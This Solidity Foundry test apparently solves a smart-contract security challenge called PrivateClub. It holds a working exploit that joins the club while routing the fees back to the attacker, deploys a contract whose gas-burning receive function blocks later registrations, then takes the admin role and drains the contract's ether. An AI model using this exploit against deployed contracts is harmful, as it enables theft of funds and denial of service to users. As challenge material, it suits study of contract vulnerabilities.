// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";

contract HackPrivateClub is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);

        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();

        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();

        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:

		// 1) hacker becomes member
		// There're 3 existing members: adminFriend, user2, user3
        address[] memory mForHacker = new address[](3);
        mForHacker[0] = hacker;
        mForHacker[1] = hacker;
        mForHacker[2] = hacker;
		club.becomeMember{value: 3 ether}(mForHacker);

		// 2) hacker's contract becomes member
		HackerContract hContract = new HackerContract();
		hContract.becomeMember{value: 4 ether}(club);
		hContract.setConsume120000Gas(true);

        vm.stopPrank();
        // check - hacker is member
        assertTrue(club.members(hacker));


        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();


        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
		club.buyAdminRole{value: 10 ether}(hacker);
		club.adminWithdraw(hacker, address(club).balance);

        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}

contract HackerContract {
	address hacker;

	// a switch for either consuming gas or not when receive ether
	bool consumeGas;

	constructor() {
		hacker = msg.sender;
	}

	function setConsume120000Gas(bool b) public {
		consumeGas = b;
	}

	function becomeMember(PrivateClub club) public payable {
		// 4 existing members: adminFriend, user2, user3, hacker
        address[] memory m = new address[](4);
        m[0] = hacker;
        m[1] = hacker;
        m[2] = hacker;
        m[3] = address(this);
		club.becomeMember{value: address(this).balance}(m);
	}

	receive() external payable {
		// redirect any ether received back to hacker
		hacker.call{value: address(this).balance}("");

		if(consumeGas) {
			uint targetGas = gasleft() - 120000;

			// consume 120000+ gas
			while(gasleft() > targetGas) {
			}
		}
	}
}
